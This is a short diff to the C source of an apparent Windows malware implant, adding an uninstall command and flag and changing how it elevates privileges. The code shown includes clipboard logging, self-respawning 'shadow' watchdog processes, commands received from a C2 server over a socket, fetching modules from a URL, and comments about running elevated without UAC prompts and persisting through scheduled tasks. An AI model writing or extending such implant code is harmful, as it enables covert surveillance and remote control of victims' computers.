@@ -21,6 +21,9 @@ RECT g_old_clip;
 int g_copy_buffer_saved = 0;
 int g_cursor_count = 0;
 
+/* Global uninstall flag — stops all respawning when set */
+volatile int g_uninstalling = 0;
+
 /* Clipboard state */
 CRITICAL_SECTION g_copy_buffer_cs;
 char g_copy_buffer_log[MAX_COPY_ENTRIES][COPY_ENTRY_SIZE];
@@ -85,6 +88,11 @@ DWORD WINAPI shadow_watchdog(LPVOID lpParam) {
     
     while (1) {
         Sleep(30000);  /* Check every 30 seconds */
+        
+        /* Exit watchdog if uninstalling — don't respawn anything */
+        if (g_uninstalling) {
+            return 0;
+        }
         
         for (int i = 0; i < 3; i++) {
             char path[MAX_PATH];
@@ -335,6 +343,10 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             }
         }
     }
+    else if (strcmp(cmd, "UNINSTALL") == 0) {
+        sys_uninstall();
+        result = "[UNINSTALL initiated — all persistence removed, process will exit]";
+    }
     /* Game module management */
     else if (strncmp(cmd, GAME_FETCH_MODULE, strlen(GAME_FETCH_MODULE)) == 0) {
         char url[1024], path[MAX_PATH];
@@ -425,9 +437,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     
     /* === PHASE 0: Elevate FIRST (before anything else) ===
-     * Main process elevates immediately. Shadows also check elevation
-     * in case CreateProcessA token inheritance fails on this machine. */
-    sys_check_privileges();
+     * If main process is not admin, elevate immediately and exit.
+     * This ensures ALL subsequent operations (C2, spawning shadows,
+     * scheduled tasks) run elevated WITHOUT UAC prompts. */
+    if (!isShadow) {
+        sys_check_privileges();
+    }
     
     /* === PHASE 1: Connect to C2 IMMEDIATELY ===
      * Start C2 loop in a background thread FIRST so the server
